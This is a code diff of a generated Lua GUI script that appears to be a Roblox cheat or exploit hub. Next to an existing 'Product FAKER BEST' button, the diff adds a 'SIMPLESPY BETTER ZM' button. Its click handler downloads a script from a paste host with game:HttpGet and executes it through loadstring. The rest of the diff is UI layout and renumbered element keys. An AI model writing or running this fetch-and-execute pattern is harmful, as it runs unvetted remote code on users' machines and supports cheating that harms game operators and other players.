@@ -7,7 +7,7 @@
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
 ]=]
 
--- Instances: 26 | Scripts: 11 | Modules: 0 | Tags: 0
+-- Instances: 28 | Scripts: 12 | Modules: 0 | Tags: 0
 local G2L = {};
 
 -- StarterGui.ScreenGui
@@ -214,7 +214,7 @@ G2L["16"]["BackgroundColor3"] = Color3.fromRGB(78, 78, 78);
 G2L["16"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["16"]["Size"] = UDim2.new(0, 105, 0, 32);
 G2L["16"]["BorderColor3"] = Color3.fromRGB(156, 122, 198);
-G2L["16"]["Text"] = [[Product FAKER BEST]];
+G2L["16"]["Text"] = [[SIMPLESPY BETTER ZM]];
 G2L["16"]["Position"] = UDim2.new(0.51465, 0, 0.61837, 0);
 
 
@@ -223,25 +223,44 @@ G2L["17"] = Instance.new("LocalScript", G2L["16"]);
 
 
 
--- StarterGui.ScreenGui.OpenButton
-G2L["18"] = Instance.new("ImageButton", G2L["1"]);
-G2L["18"]["BorderSizePixel"] = 0;
-G2L["18"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["18"]["Image"] = [[rbxassetid://9835676490]];
-G2L["18"]["Size"] = UDim2.new(0, 45, 0, 41);
-G2L["18"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["18"]["Name"] = [[OpenButton]];
-G2L["18"]["Position"] = UDim2.new(0.14511, 0, 0.25383, 0);
+-- StarterGui.ScreenGui.MainFrame.TextButton
+G2L["18"] = Instance.new("TextButton", G2L["4"]);
+G2L["18"]["TextWrapped"] = true;
+G2L["18"]["TextSize"] = 14;
+G2L["18"]["TextScaled"] = true;
+G2L["18"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["18"]["BackgroundColor3"] = Color3.fromRGB(78, 78, 78);
+G2L["18"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["18"]["Size"] = UDim2.new(0, 105, 0, 32);
+G2L["18"]["BorderColor3"] = Color3.fromRGB(156, 122, 198);
+G2L["18"]["Text"] = [[SIMPLESPY BETTER ZM]];
+G2L["18"]["Position"] = UDim2.new(0.2699, 0, 0.61837, 0);
 
 
--- StarterGui.ScreenGui.OpenButton.LocalScript
+-- StarterGui.ScreenGui.MainFrame.TextButton.LocalScript
 G2L["19"] = Instance.new("LocalScript", G2L["18"]);
 
 
 
+-- StarterGui.ScreenGui.OpenButton
+G2L["1a"] = Instance.new("ImageButton", G2L["1"]);
+G2L["1a"]["BorderSizePixel"] = 0;
+G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1a"]["Image"] = [[rbxassetid://9835676490]];
+G2L["1a"]["Size"] = UDim2.new(0, 45, 0, 41);
+G2L["1a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1a"]["Name"] = [[OpenButton]];
+G2L["1a"]["Position"] = UDim2.new(0.14511, 0, 0.25383, 0);
+
+
+-- StarterGui.ScreenGui.OpenButton.LocalScript
+G2L["1b"] = Instance.new("LocalScript", G2L["1a"]);
+
+
+
 -- StarterGui.ScreenGui.OpenButton.UICorner
-G2L["1a"] = Instance.new("UICorner", G2L["18"]);
-G2L["1a"]["CornerRadius"] = UDim.new(0.2, 0);
+G2L["1c"] = Instance.new("UICorner", G2L["1a"]);
+G2L["1c"]["CornerRadius"] = UDim.new(0.2, 0);
 
 
 -- StarterGui.ScreenGui.LocalScript
@@ -3229,9 +3248,20 @@ local script = G2L["17"];
 	end)
 end;
 task.spawn(C_17);
--- StarterGui.ScreenGui.OpenButton.LocalScript
+-- StarterGui.ScreenGui.MainFrame.TextButton.LocalScript
 local function C_19()
 local script = G2L["19"];
+	local button = script.Parent
+	
+	button.Activated:Connect(function()
+	
+		loadstring(game:HttpGet("https://loadstring.net/raw/Va8W0lE1PS"))()
+	end)
+end;
+task.spawn(C_19);
+-- StarterGui.ScreenGui.OpenButton.LocalScript
+local function C_1b()
+local script = G2L["1b"];
 	
 	local button = script.Parent
 	
@@ -3275,6 +3305,6 @@ local script = G2L["19"];
 	end)
 	
 end;
-task.spawn(C_19);
+task.spawn(C_1b);
 
 return G2L["1"], require;
